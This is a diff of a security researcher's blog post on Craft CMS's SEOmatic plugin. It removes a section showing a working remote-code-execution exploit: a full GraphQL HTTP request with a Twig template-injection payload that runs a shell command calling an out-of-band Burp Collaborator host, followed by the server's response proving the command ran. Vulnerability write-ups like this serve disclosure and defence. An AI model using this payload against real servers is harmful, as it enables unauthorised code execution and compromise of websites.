@@ -99,43 +99,6 @@ doge in ~/phpggc on master ● ● λ
 # Remote code execution 
 A few days later I found better way to exploit this vulnerability. As I mentioned earlier method `evaluateDynamicContent` was disabled at Craft CMS but it was not at **Yii::Base::View**. As you may already know Twig template engine support variables. We can use them to create new **Yii::Base::View** object and call `evaluateDynamicContent` method directly and bypass protection mechanism. Final exploit will looks like.
 
-```html
-POST /index.php?p=admin/actions/graphql/api HTTP/1.1
-Host: 127.0.0.1:8000
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:81.0) Gecko/20100101 Firefox/81.0
-Accept: application/json, text/javascript, */*; q=0.01
-Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1:8000/admin/seomatic/plugin
-X-Requested-With: XMLHttpRequest
-Connection: close
-Cookie: CRAFT_CSRF_TOKEN=65b1642b30dd16579ca51699a3392fc9a24f9802f181a5b0d1998c2f8464c15da%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A208%3A%22nzSA34Nh2-246okgxBRjTXG_qKeqgdezSL2hsKFH%7C0e8798e23345a2260452e8f25ae6cd879da745e39be67e71f9c1734da5eb2048nzSA34Nh2-246okgxBRjTXG_qKeqgdezSL2hsKFH%7C1%7C%242y%2413%24wK%2FYH5krqJrSeROBaQ9jbOjKdpMg2hHqVkwJij8Gb7z6vLkLwzohS%22%3B%7D; 
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 262
-
-query=query{seomatic(uri:"{%\nset+dum={\n'class':'yii\\\\base\\\\View'\n}\n%}{%\nset+dummy=create(dum)\n%}{{\ndummy.evaluateDynamicContent('echo+system(\\'host+3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net\\');')\n}}"){metaTitleContainer,metaTagContainer}}
-```
-
-```html
-HTTP/1.1 200 OK
-Server: nginx/1.17.3
-Date: Fri, 30 Oct 2020 14:40:37 GMT
-Content-Type: application/json; charset=UTF-8
-Connection: close
-X-Robots-Tag: none
-X-Frame-Options: SAMEORIGIN
-X-Content-Type-Options: nosniff
-X-Powered-By: Craft CMS
-Access-Control-Allow-Credentials: true
-Access-Control-Allow-Headers: Authorization, Content-Type, X-Craft-Token
-Access-Control-Allow-Origin: *
-Last-Modified: Friday, 30-Oct-2020 14:40:37 UTC
-Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0
-Content-Length: 779
-
-{"data":{"seomatic":{"metaTitleContainer":"<title>🚧 craft</title>","metaTagContainer":"<meta name=\"generator\" content=\"SEOmatic\"><meta name=\"referrer\" content=\"no-referrer-when-downgrade\"><meta name=\"robots\" content=\"none\"><meta content=\"ru_RU\" property=\"og:locale\"><meta content=\"craft\" property=\"og:site_name\"><meta content=\"website\" property=\"og:type\"><meta content=\"127.0.0.1:8000/3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net has address 52.16.21.24\n3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net mail is handled by 1 mail.3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net.\n3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net mail is handled by 1 mail.3bfekk3h7xxfbjupcfq82qmu0l6cu1.burpcollaborator.net.\" property=\"og:url\">"}}}
-```
-
 ![Seomatic RCE](/images/seomatic-rce.png)
 
 # Bonus. Server Side Request Forgery
